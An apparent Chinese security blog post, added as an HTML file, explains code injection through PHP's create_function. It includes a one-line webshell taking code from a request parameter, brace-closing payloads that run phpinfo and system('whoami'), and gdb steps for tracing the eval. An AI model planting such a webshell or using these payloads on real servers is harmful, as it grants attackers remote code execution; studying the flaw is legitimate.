@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+        <meta charset="utf-8" />
+        <title>create_function</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">Follow Your Heart </a></h1>
+                <nav><ul>
+                    <li><a href="/category/pentest.html">Pentest</a></li>
+                    <li><a href="/category/learning.html">Learning</a></li>
+                    <li><a href="/category/python.html">Python</a></li>
+                    <li><a href="/pages/tips.html">Tips</a></li>
+                    <li><a href="/pages/bash.html">Bash</a></li>
+                    <li><a href="/pages/question.html">Question</a></li>
+                    <li><a href="/pages/reverse-shell.html">各种姿势的反弹shell</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/create-function.html" rel="bookmark"
+           title="Permalink to create_function">create_function</a></h1>
+    </header>
+<footer class="post-info">
+        <span class="published" title="2019-01-10T00:00:00+01:00">
+                <a href='#'>01/10/2019 </a>
+                <a href="/category/pentest.html">Pentest</a>
+        </span>
+
+
+
+</footer><!-- /.post-info -->
+    <div class="entry-content">
+      
+      <p>p神在小密圈提了一个create_function的tips,就照之前的来说一句话:</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> <span class="nv">$sl</span> <span class="o">=</span> <span class="nb">create_function</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">]);</span><span class="nv">$sl</span><span class="p">();</span><span class="cp">?&gt;</span>
+</pre></div>
+
+
+<p>只需要单独一个create_function就可以执行函数,搜了下发现在很早的时候80sec提过这个问题:<a href="https://www.securityfocus.com/archive/1/496728">https://www.securityfocus.com/archive/1/496728</a></p>
+<p>不过说的主要是第二个参数可控的情况下。原理来说很简单,create_function是类似这样的一个函数:</p>
+<div class="highlight"><pre><span></span><span class="nv">function</span> <span class="nv">create_function</span><span class="ss">(</span><span class="mh">$a</span><span class="nv">rgs</span>, <span class="mh">$c</span><span class="nv">ode</span><span class="ss">)</span> {
+  <span class="nv">eval</span><span class="ss">(</span><span class="s2">&quot;</span>
+    <span class="nv">function</span> <span class="nv">lambda_1</span> <span class="ss">(</span><span class="mh">$a</span><span class="nv">rgs</span><span class="ss">)</span> { <span class="mh">$c</span><span class="nv">ode</span> }
+  <span class="s2">&quot;</span><span class="s">);</span>
+  <span class="k">return</span> <span class="s1">&#39;</span><span class="s">lambda_1</span><span class="s1">&#39;</span><span class="c1">;</span>
+}
+</pre></div>
+
+
+<p>所以在第二个参数可控的情况下闭合大括号<code>return 0; } echo 'outside'; //</code>，就可以执行:</p>
+<div class="highlight"><pre><span></span><span class="nv">eval</span><span class="ss">(</span><span class="s2">&quot;</span>
+  <span class="nv">function</span> <span class="nv">lambda_1</span> <span class="ss">()</span> { <span class="k">return</span> <span class="mi">0</span><span class="c1">; } echo &#39;outside&#39;; // }</span>
+<span class="s2">&quot;</span><span class="s">);</span>
+</pre></div>
+
+
+<p>第一个可控的情况下,这样就可以执行phpinfo:</p>
+<div class="highlight"><pre><span></span><span class="n">create_function</span><span class="p">(</span><span class="s1">&#39;){}phpinfo();//&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
+</pre></div>
+
+
+<p>可以放gdb里面直接调试下,在php源代码里面搜索create_function的实现，然后打断点就可以调试出来:</p>
+<div class="highlight"><pre><span></span><span class="nv">gdb</span> <span class="o">--</span><span class="nv">args</span> <span class="o">/</span><span class="nv">opt</span><span class="o">/</span><span class="nv">php72</span><span class="o">/</span><span class="nv">bin</span><span class="o">/</span><span class="nv">php</span> <span class="o">/</span><span class="nv">var</span><span class="o">/</span><span class="nv">www</span><span class="o">/</span><span class="nv">pentest</span><span class="o">/</span><span class="nv">create1</span>.<span class="nv">php</span>
+<span class="k">break</span> <span class="nv">zend_eval_stringl</span>
+<span class="nv">run</span>
+</pre></div>
+
+
+<p><img alt="" src="./images/create.png"></p>
+<p>图中的<code>function __lambda_function(){}phpinfo();//){}</code>会整个当作字符串去做一个eval,所以就可以执行phpinfo了，之前纠结的点是<code>function __lambda_func(){phpinfo();}//){}</code>这样才执行，因为看成这个函数去执行phpinfo。搜了下资料才慢慢明白。所以执行命令可以这样:</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nb">create_function</span><span class="p">(</span><span class="s1">&#39;){}system(&quot;whoami&quot;);//&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</pre></div>
+
+
+<div class="highlight"><pre><span></span><span class="nv">The</span> <span class="nv">PHP</span> <span class="nv">interpreter</span> <span class="nv">supports</span> <span class="nv">eval</span> <span class="nv">in</span> <span class="nv">which</span> <span class="nv">you</span> <span class="nv">can</span> <span class="nv">evaluate</span> <span class="nv">any</span> <span class="nv">PHP</span> <span class="nv">expression</span>. <span class="nv">An</span> <span class="nv">interesting</span> <span class="nv">eval</span> <span class="nv">function</span> <span class="nv">is</span> <span class="nv">the</span> <span class="nv">zend_eval_stringl</span> <span class="nv">function</span> <span class="nv">that</span> <span class="nv">will</span> <span class="nv">PHP</span> <span class="nv">evaluate</span> <span class="nv">a</span> <span class="nv">string</span>. <span class="nv">So</span> <span class="k">if</span> <span class="nv">we</span> <span class="nv">want</span> <span class="nv">to</span> <span class="nv">get</span> <span class="nv">the</span> <span class="nv">value</span> <span class="nv">of</span> <span class="nv">a</span> <span class="nv">specific</span> <span class="nv">variable</span> <span class="mh">$f</span><span class="nv">oo</span> <span class="nv">in</span> <span class="nv">a</span> <span class="nv">diversion</span> <span class="nv">session</span> <span class="nv">in</span> <span class="nv">RR</span> <span class="nv">we</span> <span class="nv">can</span> <span class="nv">execute</span> <span class="nv">print</span> <span class="nv">zend_eval_stringl</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">var_export($foo, true)</span><span class="s2">&quot;</span>, ...<span class="ss">)</span> <span class="nv">in</span> <span class="nv">GDB7</span>. <span class="nv">To</span> <span class="nv">get</span> <span class="nv">the</span> <span class="nv">stack</span> <span class="nv">trace</span> <span class="nv">we</span> <span class="nv">can</span> <span class="k">call</span> <span class="nl">the</span> <span class="nv">PHP</span> <span class="nv">function</span> <span class="nv">debug_backtrace</span><span class="ss">()</span> <span class="nv">via</span> <span class="nv">zend_eval_stringl</span>. 
+</pre></div>
+
+
+<p>另外一点，匿名函数在php里面是有名字的:<code>\0__lambda_1</code>，最后1是数字，从小到达排列，它的第一个字符是空字符<code>\0</code>，因为用户无法在代码中定义这样的函数，其实还是可以的<code>&lt;?php $my_func = chr(0) . "lambda_1";</code>，关于匿名函数有名字这个可以在Hitcon 2017 《Baby^H Master PHP 2017》的writeup里面找到。</p>
+<ul>
+<li><a href="https://github.com/sidkshatriya/dontbug/wiki/How-the-Dontbug-Debugger-works#foot7">https://github.com/sidkshatriya/dontbug/wiki/How-the-Dontbug-Debugger-works#foot7</a></li>
+<li><a href="https://github.com/CopernicaMarketingSoftware/PHP-CPP/blob/master/zend/script.cpp">https://github.com/CopernicaMarketingSoftware/PHP-CPP/blob/master/zend/script.cpp</a></li>
+<li><a href="https://gywbd.github.io/posts/2016/2/debug-php-source-code.html">https://gywbd.github.io/posts/2016/2/debug-php-source-code.html</a></li>
+<li><a href="http://xdxd.love/2018/04/12/%E4%B8%80%E6%AC%A1php%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E7%9A%84%E7%BB%8F%E5%8E%86/">http://xdxd.love/2018/04/12/%E4%B8%80%E6%AC%A1php%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E7%9A%84%E7%BB%8F%E5%8E%86/</a> </li>
+<li><a href="https://gywbd.github.io/posts/2016/2/vld-opcode.html">https://gywbd.github.io/posts/2016/2/vld-opcode.html</a></li>
+<li><a href="http://treelib.com/book-detail-id-15-aid-604.html">http://treelib.com/book-detail-id-15-aid-604.html</a></li>
+</ul>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+        </section><!-- /#extras -->
+
+
+</body>
+</html>
